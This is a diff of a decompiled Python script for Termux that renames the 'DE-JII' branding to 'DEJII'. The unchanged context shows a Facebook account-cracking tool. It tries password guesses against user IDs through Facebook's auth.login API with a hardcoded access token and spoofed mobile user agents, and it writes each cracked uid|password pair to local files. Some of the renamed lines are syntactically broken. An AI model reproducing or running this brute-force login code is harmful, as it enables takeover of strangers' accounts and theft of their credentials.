@@ -1,4 +1,4 @@
-#De-jii
+#DEJII
 # Time Succes decompile : 2022-05-22 23:34:12.924217
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -80,7 +80,7 @@ def back():
 
 ah="TRICKER-"
 imt="-M4786=="
-ak="DE-JII-"
+ak="DEJII-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[DE-JII] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[DEJII] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -417,13 +417,13 @@ class Main:
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
 		print("")
-		DE-JII == input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if DE-JII in ["", " "]:
+		DEJII == input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if DEJII in ["", " "]:
 			exit()
-		elif DE-JII in ["2", "02"]:
+		elif DEJII in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		elif DE-JII in ["1", "01"]:
+		elif DEJII in ["1", "01"]:
 			os.system("xdg-open https://youtube.com/@musiclife1936")
 			print("")
 			time.sleep(2.0)
@@ -875,12 +875,12 @@ class Main:
 				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-DE-JII -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-DEJII -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[DE-JII-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DEJII-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-DE-JII-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-DEJII-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1282,7 +1282,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [DE-JII ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [DEJII ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1299,15 +1299,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[DE-JII-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DEJII-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-DE-JII-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-DEJII-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[DE-JII-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DEJII-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-DE-JII-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-DEJII-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1332,8 +1332,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32mDE-JII Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note :DE-JII FREE TOOLS ENJOY  \033[1;37m")
+		print(" \033[1;32mDEJII Toll Free BUT You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note :DEJII FREE TOOLS ENJOY  \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
